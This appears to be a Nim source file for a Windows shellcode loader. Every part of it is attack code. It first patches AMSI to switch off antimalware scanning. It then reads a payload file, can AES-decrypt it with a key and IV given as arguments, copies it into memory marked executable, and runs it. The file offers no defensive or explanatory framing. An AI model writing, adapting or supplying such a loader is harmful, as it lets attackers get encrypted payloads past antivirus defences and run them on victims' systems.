import winim
import std/os
import std/strutils
import amsi

proc aesDecrypt(data: var seq[byte]; key, iv: openArray[byte]) =
  var
    hAlg:     BCRYPT_ALG_HANDLE = nil
    hKey:     BCRYPT_KEY_HANDLE = nil
    cbResult: ULONG             = 0
    ivCopy                      = newSeq[byte](iv.len)
  copyMem(addr ivCopy[0], unsafeAddr iv[0], iv.len)

  discard BCryptOpenAlgorithmProvider(addr hAlg, BCRYPT_AES_ALGORITHM, nil, 0)
  var cbcMode = BCRYPT_CHAIN_MODE_CBC
  discard BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                            cast[PUCHAR](addr cbcMode), ULONG(sizeof(cbcMode)), 0)
  discard BCryptGenerateSymmetricKey(hAlg, addr hKey, nil, 0,
                                     cast[PUCHAR](unsafeAddr key[0]), ULONG(key.len), 0)
  discard BCryptDecrypt(hKey,
                        cast[PUCHAR](addr data[0]), ULONG(data.len), nil,
                        cast[PUCHAR](addr ivCopy[0]), ULONG(iv.len),
                        cast[PUCHAR](addr data[0]), ULONG(data.len),
                        addr cbResult, 0)
  BCryptDestroyKey(hKey)
  BCryptCloseAlgorithmProvider(hAlg, 0)
  data.setLen(cbResult.int)

proc parseHexBytes(s: string): seq[byte] =
  let clean = s.replace(" ", "").replace(",", "").replace("0x", "")
  result = newSeq[byte](clean.len div 2)
  for i in 0 ..< result.len:
    result[i] = byte(parseHexInt(clean[i*2 .. i*2+1]))

proc main() =
  patchAmsi()

  if paramCount() < 1:
    quit(1)

  let filename = paramStr(1)

  var f: File
  if not open(f, filename, fmRead):
    quit(1)

  let size = f.getFileSize().int
  var shellcode = newSeq[byte](size)
  discard f.readBuffer(addr shellcode[0], size)
  f.close()

  if paramCount() >= 3:
    let key = parseHexBytes(paramStr(2))
    let iv  = parseHexBytes(paramStr(3))
    if key.len != 32 or iv.len != 16:
      quit(1)
    aesDecrypt(shellcode, key, iv)

  let buf = VirtualAlloc(nil, SIZE_T(shellcode.len),
                         MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if buf == nil: quit(1)

  copyMem(buf, addr shellcode[0], shellcode.len)

  var oldProtect: DWORD = 0
  discard VirtualProtect(buf, SIZE_T(shellcode.len), PAGE_EXECUTE_READ, addr oldProtect)

  cast[proc() {.cdecl.}](buf)()

main()
